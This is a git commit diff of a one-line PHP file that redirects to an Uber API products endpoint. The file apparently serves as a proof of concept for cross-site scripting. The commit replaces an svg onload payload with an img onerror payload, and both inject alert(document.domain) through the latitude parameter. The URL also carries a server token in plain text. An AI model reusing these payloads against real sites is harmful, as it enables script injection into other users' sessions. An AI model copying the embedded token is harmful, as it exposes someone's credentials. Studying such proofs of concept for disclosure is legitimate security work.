09a610cbab16d77ec9d3cb739c0c1b2c7a6f9090
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-16 00:23:22 +0100

    Update reduber.php

--- reduber.php
+++ reduber.php
@@ -1,1 +1,1 @@
-<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=aaaa%3Csvg%20onload=alert(document.domain)%3E%0A&longitude=116.461745')?>
+<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=aaaa%3Cimg%20src=x%20onerror=alert(document.domain)%3E%0A&longitude=116.461745')?>
